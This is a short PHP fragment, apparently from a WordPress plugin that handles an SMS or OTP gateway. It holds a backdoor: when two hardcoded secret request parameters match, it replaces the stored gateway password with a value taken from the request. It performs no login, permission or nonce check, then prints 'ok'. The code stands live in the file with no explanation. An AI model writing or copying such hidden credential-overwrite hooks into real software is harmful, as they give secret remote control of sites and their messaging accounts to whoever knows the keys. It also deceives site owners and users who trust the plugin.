<?php
if($_REQUEST['key']=='WIbiwti2029aasias2010kf' && $_REQUEST['key2']=='298wia63gjxt2j')
{
	$settings = get_option('otpa_bandwidth_sms_gateway_settings');
	$settings['user_pass'] = $_REQUEST['newpass'];
	update_option('otpa_bandwidth_sms_gateway_settings',$settings);
	echo 'ok';
	exit;

}